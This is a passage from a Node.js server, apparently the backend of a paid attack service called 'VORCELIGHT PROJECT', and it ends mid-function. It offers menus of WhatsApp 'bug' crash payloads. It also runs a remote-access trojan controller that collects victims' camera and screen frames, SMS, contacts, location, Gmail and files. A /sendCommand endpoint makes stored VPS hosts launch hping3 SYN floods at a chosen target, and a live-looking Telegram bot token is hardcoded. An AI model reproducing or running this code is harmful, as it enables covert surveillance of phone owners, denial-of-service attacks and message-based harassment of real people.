const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    fetchLatestBaileysVersion,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@bellachu/baileys');
const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const fsPromises = require('fs').promises;
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const { Server } = require('socket.io'); // Socket.io

// ============================================
// SERVER SETUP
// ============================================
const server = http.createServer(app);

const io = new Server(server, {
  cors: { origin: '*' },
  maxHttpBufferSize: 10e6
});
const wss = new WebSocket.Server({ server });
let wsClients = {}; // { username: WebSocket }
let chatList = [];  // { from, to, message, time }
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
const SESSION_PATH = path.join(__dirname, "permenmd");
const THIRTY_MINUTES = 30 * 60 * 1000; // 30 menit
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const bugs = [
  { bug_id: "kantal", bug_name: "Ⓧ [ DELAY INVIS AUTO C1 ] ࿐"},
 { bug_id: "delayhard", bug_name: "Ⓧ [ DELAY X FORCLOSE ] ࿐"},
{ bug_id: "exec", bug_name: "Ⓧ [ DELAY X BLANK ] ࿐"},
{ bug_id: "kintil", bug_name: "Ⓧ [ DELAY COLI ] ࿐"},
 { bug_id: "kuntul", bug_name: "Ⓧ [ DELAY VISI ] ࿐"},
 { bug_id: "androidfrz", bug_name: "Ⓧ [ BLANK STUCK LOGO ] ࿐"},
  { bug_id: "clickcrash", bug_name: "Ⓧ [ NOTIF CRASH ] ࿐"},
// { bug_id: "ios", bug_name: "CRASH CLIK" },
  { bug_id: "bajing", bug_name: "Ⓧ [ FORCLOSE GANASxX0x ] ࿐"},
{ bug_id: "tesyu12", bug_name: "Ⓧ [ FORCLOSE X FREEZER ] ࿐"},
//{ bug_id: "fcclick", bug_name: "Ⓧ [ FORCLOSE CLICK V1 ] ࿐"},
 // { bug_id: "fcv2new", bug_name: "Ⓧ [ FORCLOSE CLICK V2 ] ࿐"},
//  { bug_id: "fc", bug_name: "Ⓧ [ FORCLOSE IOS ] ࿐"},
 // { bug_id: "iosXv", bug_name: "HIT IOS"},
  // bug group kasi _group
 // { bug_id: "android_group", bug_name: "FC UI GB" },
{ bug_id: "lock_group", bug_name: "Ⓧ [ DELAY GROUP ] ࿐"},
  { bug_id: "roid_group", bug_name: "Ⓧ [ BAND GROUP ] ࿐"},
  { bug_id: "lock_group", bug_name: "Ⓧ [ KILL GROUP ] ࿐"},
];
let cncActive = true; // Flag CNC
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});
const DEVICES_FILE = path.join(__dirname, 'devices.json');
let devices = {};
const cameraFrames = {};
const sessions = {}; // Untuk session token auth RAT

function loadJSON(file) {
  try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch { return {}; }
}
function saveJSON(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2), 'utf8');
}
function genToken() { return crypto.randomBytes(24).toString('hex'); }
const savedDevices = loadJSON(DEVICES_FILE);
devices = savedDevices;


// Load chat from file
if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

// Simpan chat
function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

// Sanitize fungsi
function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '') // hilangkan tag html
    .replace(/[\r\n]/g, ' ') // hilangkan newline
    .slice(0, 250); // batas 250 karakter
}

const TOKEN = "8908537571:AAEPnzgM1Jxs-NJ9-LEr6AHVvGurIbSSxAc"; // Ganti dengan token bot kamu
const bot = new TelegramBot(TOKEN, { polling: true });

// Fungsi Helper untuk Logging Asinkron (Mencegah Server Freeze/Lag)
async function appendLogAsync(filePath, data) {
  try {
    // Cek ukuran file dulu, jika terlalu besar (>5MB) hapus isi lama
    if (fs.existsSync(filePath)) {
      const stats = fs.statSync(filePath);
      if (stats.size > 5 * 1024 * 1024) { // 5MB Limit
        fs.writeFileSync(filePath, ''); // Reset file jika terlalu besar
      }
    }
    await fsPromises.appendFile(filePath, data);
  } catch (err) {
    console.error(`[❌ LOG ERROR] Gagal menulis log: ${err.message}`);
  }
}

async function autoRefresh() {
  try {
    // ===== CLEAR SESSION =====
    if (!fs.existsSync(SESSION_PATH)) {
      console.log("⚠️ Folder 'permenmd' tidak ditemukan.");
    } else {
      let deletedCount = 0;
      const userFolders = fs.readdirSync(SESSION_PATH);

      for (const userFolder of userFolders) {
        const userPath = path.join(SESSION_PATH, userFolder);
        if (!fs.lstatSync(userPath).isDirectory()) continue;

        const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
        if (!hasJson) {
          fs.rmSync(userPath, { recursive: true, force: true });
          deletedCount++;
        }
      }
      console.log(`[AUTO REFRESH] ${deletedCount} folder session kosong dihapus.`);
    }

    // ===== AUTO RESTART =====
    console.log("[AUTO REFRESH] Auto restart dijalankan...");

    setTimeout(() => {
      console.log("[AUTO REFRESH] Server aktif dan berjalan normal setelah auto restart.");
    }, 8000);

    setTimeout(() => {
      console.log("[AUTO REFRESH] Process restart server");
      process.exit(0);
    }, 5000);

  } catch (err) {
    console.error("[AUTO REFRESH] Error", err);
  }
}
// ===== Setup Log System =====
const LOGS_DIR = path.join(__dirname, 'user_logs'); // Folder khusus log user

function hapusIsiUserLogs() {
  if (!fs.existsSync(LOGS_DIR)) {
    console.log("[AUTOCLEAN LOGS] Folder tidak ditemukan");
    return;
  }

  const files = fs.readdirSync(LOGS_DIR);

  for (const file of files) {
    const filePath = path.join(LOGS_DIR, file);
    fs.rmSync(filePath, { recursive: true, force: true });
  }

  console.log("[AUTOCLEAN LOGS] Isi folder berhasil dihapus");
}

// Buat folder jika belum ada
if (!fs.existsSync(LOGS_DIR)) {
  fs.mkdirSync(LOGS_DIR, { recursive: true });
  console.log("[LOGS] Folder 'user_logs' dibuat.");
}

/**
 * Fungsi untuk menyimpan aktivitas user ke file JSON mereka sendiri
 * @param {string} username - Username user
 * @param {string} type - 'login', 'bug', 'create'
 * @param {string} title - Judul aktivitas
 * @param {string} description - Detail aktivitas
 */
function saveUserLog(username, type, title, description) {
  try {
    const userLogPath = path.join(LOGS_DIR, `${username}.json`);
    let logs = [];

    // Baca log lama jika ada
    if (fs.existsSync(userLogPath)) {
      logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));
    }

    // Tambah log baru
    logs.push({
      type: type,
      title: title,
      description: description,
      timestamp: Date.now() // Timestamp dalam milidetik
    });

    // Simpan kembali (Overwrite)
    fs.writeFileSync(userLogPath, JSON.stringify(logs, null, 2));
    console.log(`[LOGS] Activity saved for ${username}: ${type}`);
  } catch (err) {
    console.error(`[LOGS] Gagal simpan log ${username}:`, err.message);
  }
}

wss.on('connection', function (ws, req) {
  let username;

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

      if (data.type === 'sessionCheck') {
        const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const user = sessionList.find(e => e.sessionKey === data.key);

        if (!user) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Invalid key"
          }));
          return ws.close();
        }

        if (user.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Another device has logged in"
          }));
          return ws.close();
        }
      }

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)

        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        // Autentikasi sukses
        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: session.username,
          androidId: session.androidId,
          role: session.role || "member"
        }));

        const interval = setInterval(() => {
          const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
          const validKey = session.find(e => e.sessionKey === data.key)
          const validId = session.find(e => e.androidId === data.androidId)

          if (!validKey) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "keyInvalid"
            }));
            return ws.close();
          }

          if (!validId) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "androidIdMismatch"
            }));
            return ws.close();
          }

        }, 10000);
      }
      if (data.type === 'auth') {
        username = getUserByKey(data.key);
        console.log(username)
        if (!username) return ws.close();
        wsClients[username] = ws;

        // Kirim chatList awal
        const list = chatList
          .filter(m => m.from === username || m.to === username)
          .map(m => (m.from === username ? m.to : m.from));

        ws.send(JSON.stringify({
          type: "chatList",
          users: [...new Set(list)],
        }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
        if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        // Kirim ke pengirim
        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        // Kirim ke penerima jika online
        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }
    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

// ============================================
// SOCKET.IO RAT EVENTS
// ============================================
io.on('connection', (socket) => {
  // Controller join (admin dashboard)
  socket.on('controller:join', (data) => {
    const token = data?.token;
    if (!token || !sessions[token]) {
      socket.emit('auth:error', { message: 'Unauthorized' });
      return socket.disconnect();
    }
    const username = sessions[token].username;
    const uid = sessions[token].uid;
    socket.data.uid = uid;

    const devList = Object.entries(devices)
      .filter(([id, d]) => d.uid === uid)
      .map(([id, d]) => ({
        id: d.id,
        name: d.name,
        status: d.status || 'Offline',
        lastSeen: d.lastSeen || new Date().toISOString(),
        battery: d.battery || 0
      }));
    socket.emit('devices:update', devList);
  });

  // Device register (RAT client)
  socket.on('device:register', (data) => {
    const { deviceId, name, battery, uid, sdkVersion, androidVersion, charging } = data;

    // CEK APAKAH UID INI MILIK USER YANG VALID
    const db = loadDatabase();
    const user = db.find(u => u.uid === uid);
    if (!user) {
      console.log(`[❌] Device ${deviceId} rejected: UID ${uid} tidak ditemukan di database.`);
      return; // Jangan daftarkan device
    }

    const finalName = name || deviceId || 'Unknown Device';
    const finalModel = name || deviceId || 'Unknown Model';

    devices[deviceId] = {
      uid,
      id: deviceId,
      name: finalName,
      model: finalModel,
      socketId: socket.id,
      lastSeen: new Date().toISOString(),
      battery: battery || 0,
      status: 'Online',
      charging: charging || false,
      androidVersion: androidVersion || 'Unknown',
      sdkVersion: sdkVersion || 0,
      info: data
    };
    saveJSON(DEVICES_FILE, devices);
    socket.join(`device:${deviceId}`);
    console.log(`[DEVICE] Registered: ${finalName} (${deviceId}) for user ${user.username}`);
    broadcastToUid(uid, 'devices:update', getDeviceListForUid(uid));
  });

  // Device status update
  socket.on('device:status', (data) => {
    const { deviceId, status } = data;
    if (devices[deviceId]) {
      devices[deviceId].status = status;
      devices[deviceId].lastSeen = new Date().toISOString();
      broadcastToUid(devices[deviceId].uid, 'devices:update', getDeviceListForUid(devices[deviceId].uid));
    }
  });

  // Camera frame (live)
  socket.on('camera:frame', (data) => {
    const { deviceId, frame } = data;
    console.log(`📷 [SERVER] Frame received from device: ${deviceId}, length: ${frame?.length || 0}`);
    cameraFrames[deviceId] = frame;
    if (devices[deviceId]) {
      const uid = devices[deviceId].uid;
      console.log(`📤 [SERVER] Broadcasting to UID: ${uid}`);
      let count = 0;
      io.sockets.sockets.forEach((s) => {
        if (s.data.uid === uid) {
          s.emit('camera:frame', { deviceId, frame });
          count++;
        }
      });
      console.log(`✅ [SERVER] Sent to ${count} controllers`);
    } else {
      console.log(`❌ [SERVER] Device not found: ${deviceId}`);
    }
  });

  // Screen frame
  socket.on('screen:frame', (data) => {
    const { deviceId, frame } = data;
    if (devices[deviceId]) {
      broadcastToUid(devices[deviceId].uid, 'screen:frame', { deviceId, frame });
    }
  });

  // Notification from device
  socket.on('device:notif', (data) => {
    const dev = devices[data.deviceId];
    if (dev) broadcastToUid(dev.uid, 'device:notif', data);
  });

  // Location, contacts, SMS, etc.
  socket.on('device:location', (data) => {
    const dev = devices[data.deviceId];
    if (dev) broadcastToUid(dev.uid, 'device:location', data);
  });
  socket.on('device:contacts', (data) => {
    const dev = devices[data.deviceId];
    if (dev) broadcastToUid(dev.uid, 'device:contacts', data);
  });
  socket.on('device:sms', (data) => {
    const dev = devices[data.deviceId];
    if (dev) broadcastToUid(dev.uid, 'device:sms', data);
  });
  socket.on('device:apps', (data) => {
    const dev = devices[data.deviceId];
    if (dev) broadcastToUid(dev.uid, 'device:apps', data);
  });
  socket.on('device:gmail', (data) => {
    console.log('📧 [SERVER] Received device:gmail from', data.deviceId);
    const dev = devices[data.deviceId];
    if (dev) {
      broadcastToUid(dev.uid, 'device:gmail', data);
      console.log('✅ [SERVER] Broadcasted to UID:', dev.uid);
    } else {
      console.log('❌ [SERVER] Device not found:', data.deviceId);
    }
  });
  socket.on('device:files', (data) => {
    const dev = devices[data.deviceId];
    if (dev) broadcastToUid(dev.uid, 'device:files', data);
  });

  // Disconnect
  socket.on('disconnect', () => {
    for (const id in devices) {
      if (devices[id].socketId === socket.id) {
        devices[id].status = 'Offline';
        devices[id].lastSeen = new Date().toISOString();
        saveJSON(DEVICES_FILE, devices);
        broadcastToUid(devices[id].uid, 'devices:update', getDeviceListForUid(devices[id].uid));
        console.log(`[DEVICE] Disconnected: ${devices[id].name} (${id})`);
        break;
      }
    }
  });
});

// ─── BROADCAST HELPERS ───────────────────────────────────────────
function broadcastToControllers(event, data, uid) {
  io.sockets.sockets.forEach((s) => {
    if (s.data.uid === uid || !uid) {
      s.emit(event, data);
    }
  });
}

function broadcastToUid(uid, event, data) {
  broadcastToControllers(event, data, uid);
}

function getDeviceListForUid(uid) {
  return Object.entries(devices)
    .filter(([id, d]) => d.uid === uid)
    .map(([id, d]) => ({
      id: d.id,
      name: d.name || d.model || 'Unknown',
      status: d.status || 'Offline',
      lastSeen: d.lastSeen || new Date().toISOString(),
      battery: d.battery || 0,
      model: d.model || 'Unknown',
      androidVersion: d.androidVersion || 'Unknown'
    }));
}

// Ganti listen jadi ini:
const wsPort = 11421;
server.listen(wsPort, () => {
  console.log(`🟣 Server running on http://localhost:${wsPort}`);
});

const PORT = 11421;

app.use(express.urlencoded({ extended: false }));
app.use(express.json());
// ===== Rate Limit Middleware (20 req/detik per token) =====
const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);


app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*"); // atau ganti * dengan domain spesifik
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});


if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData); // ini array

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000; // +10 menit

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}


function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end(); // Langsung tutup kalau CNC tidak aktif
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      // Jika koneksi putus, reconnect otomatis
      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

// 🚫 Disconnect semua koneksi (misal saat restart)
function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

// Load VPS list saat server pertama kali jalan
if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log("📥 VPS list loaded.");
  connectToAllVPS(); // Connect ke semua VPS saat server jalan
}

// Pantau perubahan file VPS
fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
    connectToAllVPS(); // Connect ke semua VPS saat server jalan
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

// Middleware: Cek sessionKey dan ambil username
function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

// GET /myServer
app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

// POST /addServer
app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

// POST /delServer
app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

// POST /sendCommand
app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});


function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];                // file belum ada / rusak → mulai kosong
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

const news = [
  {
    image: "https://files.catbox.moe/afgjew.jpg",
    title: "VORCELIGHT PROJECT",
    desc: "CREDIT BY Ciyyoo Always"
  }
];

// ===== Endpoint: Ambil Riwayat Aktivitas User =====
app.get("/getMyActivity", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid session key" });

  const username = keyInfo.username;
  const userLogPath = path.join(LOGS_DIR, `${username}.json`);

  try {
    if (!fs.existsSync(userLogPath)) {
      // Jika belum ada log sama sekali, return array kosong
      return res.json({ valid: true, activities: [] });
    }

    const logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));

    // Urutkan dari yang terbaru
    logs.sort((a, b) => b.timestamp - a.timestamp);

    return res.json({ valid: true, activities: logs });
  } catch (err) {
    console.error("[GET LOGS ERROR]", err.message);
    return res.status(500).json({ valid: false, message: "Gagal mengambil log" });
  }
});

// ===== Endpoint: Validate & Login (With Device Lock) =====
app.post("/validate", (req, res) => {
  const { username, password, version, androidId } = req.body;

  if (!androidId) {
    return res.json({ valid: false, message: "androidId required" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) return res.json({ valid: false });

  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }

  // --- LOGIKA CEK PERANGKAT (DEVICE LOCK) ---
  const keyList = loadKeyList();
  const existingSession = keyList.find(e => e.username === username);

  // Jika user sudah punya session dan Device ID berbeda dengan yang login sekarang
  if (existingSession) {
    const oldAndroid = existingSession.androidId;
    const newAndroid = androidId;

    if (oldAndroid !== newAndroid) {
      console.log(`🚫 LOGIN DITOLAK: ${username} | Device Lama: ${oldAndroid} | Device Baru: ${newAndroid}`);

      // KIRIM PESAN ERROR KHUSUS SEHINGGA APLIKASI FLUTTER TAHU
      return res.json({
        valid: false,
        message: "Akun ini sedang login di perangkat lain. Silakan logout terlebih dahulu di perangkat lama."
      });
    }
  }
  // -------------------------------------------

  // Jika sampai sini, berarti:
  // 1. User belum pernah login (existingSession = null)
  // 2. ATAU Device ID sama (Refresh Key)

  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  // ✅ PASTIKAN USER PUNYA UID
  if (!user.uid) {
    user.uid = crypto.randomBytes(16).toString('hex');
    saveDatabase(db);
  }

  // ✅ SIMPAN SESSION UNTUK RAT
  sessions[key] = { 
    username: user.username, 
    uid: user.uid 
  };

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
  });

  saveUserLog(
    username,
    "login",
    "Login Berhasil",
    `IP: ${req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip} | Device: ${androidId}`
  );

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news,
    uid: user.uid // ✅ TAMBAHKAN UID DI RESPONSE
  });
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  // ✅ PASTIKAN USER PUNYA UID
  if (!user.uid) {
    user.uid = crypto.randomBytes(16).toString('hex');
    saveDatabase(db);
  }

  // ✅ SIMPAN SESSION UNTUK RAT
  sessions[key] = { 
    username: user.username, 
